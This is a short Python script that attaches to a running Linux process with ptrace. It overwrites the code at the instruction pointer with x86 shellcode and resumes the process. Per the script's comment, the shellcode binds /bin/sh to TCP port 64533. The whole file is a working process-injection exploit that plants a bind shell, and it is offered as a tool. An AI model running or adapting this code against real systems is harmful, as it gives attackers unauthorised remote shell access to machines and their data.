#!/usr/bin/python
import commands
from ptrace.debugger.debugger import PtraceDebugger
from ptrace.debugger.debugger import PtraceProcess
import sys

cyan = "\x1b[1;36m"
clear = "\x1b[0m"
procname = "test" # XXX: FOR TESTING

def getpid(procname):
    pid = commands.getoutput("pidof %s" %(procname))
    return pid

def attach(pid):
    print "%s{+} Attaching to %s %s" %(cyan, pid, clear)
    dbg = PtraceDebugger()
    process = dbg.addProcess(int(pid), False)
    return process

# port bind /bin/sh 64533/TCP
shellcode = "\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80"

def inject(process, shellcode):
    eip = process.getInstrPointer()
    print "%s{*} EIP: %s %s" %(cyan, eip, clear)
    print "%s{*} Insert Shellcodez...%s" %(cyan, clear)
    bytes = process.writeBytes(eip, shellcode)
    print "%s{*} Setting ebx to 0...%s" %(cyan, clear)
    process.setreg("ebx", 0)
    print "%s{*} Carry on camping...%s" %(cyan, clear)
    process.cont()
    sys.exit(0)

def main():
    inject(attach(getpid(procname)), shellcode)

if __name__ == "__main__":
    main()

